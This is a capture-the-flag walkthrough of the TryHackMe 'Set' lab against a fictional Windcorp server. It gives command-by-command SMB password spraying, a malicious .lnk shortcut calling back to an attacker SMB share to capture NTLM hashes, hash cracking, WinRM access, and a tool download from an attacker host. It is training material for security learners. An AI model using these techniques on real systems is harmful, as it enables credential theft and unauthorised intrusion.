# [Set](https://tryhackme.com/room/set)

## Once again you find yourself on the internal network of the Windcorp Corporation.

# Set

## Story. Once again you find yourself on the internal network of the Windcorp Corporation. This tasted so good last time you were there, you came back for more. However, they managed to secure the Domain Controller this time, so you need to find another server and on your first scan discovered "Set". Set is used as a platform for developers and has had some problems in the recent past. They had to reset a lot of users and restore backups (maybe you were not the only hacker on their network?). So they decided to make sure all users used proper passwords and closed of some of the loose policies. Can you still find a way in? Are some user more privileged than others? Or some more sloppy? And maybe you need to think outside the box a little bit to circumvent their new security controls…

### Flag 1

1. Start with an nmap scan to identify open services and ports on the target machine

```bash
nmap <TARGET_IP>
```

<img width="724" height="290" alt="SCREEN01" src="https://github.com/user-attachments/assets/68846da0-0ce7-4395-8995-8e58896abccc" />

2. Attempt a direct connection, then add the hostname to our hosts file

```bash
curl -v -k https://<TARGET_IP>
echo "<TARGET_IP> set.windcorp.thm" >> /etc/hosts
```

<img width="723" height="432" alt="SCREEN02" src="https://github.com/user-attachments/assets/e9dc210d-02d0-49b3-a003-82b263a5b678" />

3. Examine the search.js function in the `https://set.windcorp.thm/` source code to understand how the application works. The JavaScript reveals that user data is loaded from an XML file, which contains employee information

```bash
curl -k https://set.windcorp.thm/assets/data/users.xml
```

4. Extract usernames from the users.xml file to build a list for potential attacks

```bash
curl -k https://set.windcorp.thm/assets/data/users.xml | grep -o '<email>[^<]*</email>' | sed 's/<[^>]*>//g' | cut -d'@' -f1 | sort | uniq > usernames.txt
```

5. Use Metasploit's SMB login scanner to test common passwords against the discovered usernames
   - Successfully discovered credentials: `myrtleowe:Passw@rd`

```bash
msfconsole
use auxiliary/scanner/smb/smb_login
set RHOSTS <TARGET_IP>
set USER_FILE usernames.txt
set PASS_FILE /root/Tools/wordlists/SecLists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt
run
creds
```

<img width="721" height="434" alt="SCREEN03" src="https://github.com/user-attachments/assets/f21bbcf3-dffa-44e9-8f81-92ca33d20f69" />

6. Use the discovered credentials to access SMB shares and gather information

```bash
smbclient -L //<TARGET_IP> -U myrtleowe
smbclient //<TARGET_IP>/Files -U myrtleowe
ls
get Info.txt
```

<img width="723" height="431" alt="SCREEN04" src="https://github.com/user-attachments/assets/aeb42e2c-8c78-45a7-bcf2-4cb60f4a620d" />

7. Read the downloaded file to obtain the first flag

```bash
cat Info.txt
```

<img width="721" height="110" alt="SCREEN05" src="https://github.com/user-attachments/assets/c229414b-eb1b-4f7a-a739-5d7aa347d533" />

---

### Flag 2

1. Download and use [mslink](https://www.mamachine.org/mslink/index.en.html) tool to create a malicious .lnk file that will capture credentials when opened. The malicious shortcut will attempt to connect to our SMB server when opened

```bash
./mslink_v1.3.sh -l test -n shortcut -i \\\\<ATTACKER_IP>\\share -o shortcut.lnk
zip shortcut.zip shortcut.lnk
```

2. Start an SMB server to capture authentication attempts from the malicious shortcut

```bash
sudo python3 /opt/impacket/examples/smbserver.py -smb2support share .
```

3. Upload the malicious shortcut to the target's file share

```bash
smbclient //<TARGET_IP>/Files -U myrtleowe
put shortcut.zip
```

<img width="720" height="436" alt="SCREEN06" src="https://github.com/user-attachments/assets/2ac0283d-111b-4c7b-94ea-3e7a31c3f8a3" />

4. Wait for a user to open the malicious file, capture their NTLM hash, and crack it
   - Successfully captured and cracked: `MichelleWat:!!!MICKEYmouse`

```bash
john hash --wordlist=/root/Tools/wordlists/rockyou.txt
```

<img width="720" height="269" alt="SCREEN07" src="https://github.com/user-attachments/assets/448ba22f-175c-40ef-9b16-606136fcd084" />

5. Use the cracked credentials to gain remote access via WinRM and retrieve the second flag

```bash
evil-winrm -i <TARGET_IP> -u MichelleWat -p '!!!MICKEYmouse'
cd ../Desktop
dir
more Flag2.txt
```

<img width="721" height="279" alt="SCREEN08" src="https://github.com/user-attachments/assets/9284a445-a839-4df2-ab2f-29ff1c17ba42" />

---

### Flag 3

1. Examine running services and network connections to identify potential attack vectors. The output shows unusual ports 49713 and 2805 associated with process ID 5000, indicating a potentially vulnerable service

```bash
netstat -ao
```

<img width="720" height="437" alt="SCREEN09" src="https://github.com/user-attachments/assets/d41c2d50-a05f-4931-9b93-38e2fc2fe8dd" />

2. Identify which process is running on the discovered ports

```bash
Get-Process -Id 5000
```

<img width="722" height="110" alt="SCREEN10" src="https://github.com/user-attachments/assets/5fa183fc-3ebb-4397-8c74-78bde9d29360" />

3. Locate and examine the Veeam ONE Agent service files to understand the application

```bash
Get-ChildItem C:\ -recurse -ErrorAction SilentlyContinue | Where-Object {$_.Name -match "Veeam.One.Agent"}
Get-Item 'C:\Program Files\Veeam\Veeam ONE\Veeam ONE Agent\Veeam.One.Agent.Service.exe' | Format-List *
```

<img width="719" height="377" alt="SCREEN11" src="https://github.com/user-attachments/assets/de143d81-e134-45ad-a5d7-c8125a9e56fd" />

4. Download plink.exe to establish a tunnel for exploiting the identified service

```bash
wget https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe
python -m SimpleHTTPServer
```

```bash
Invoke-WebRequest -Uri http://<ATTACKER_IP>:8000/plink.exe -Outfile plink.exe
```
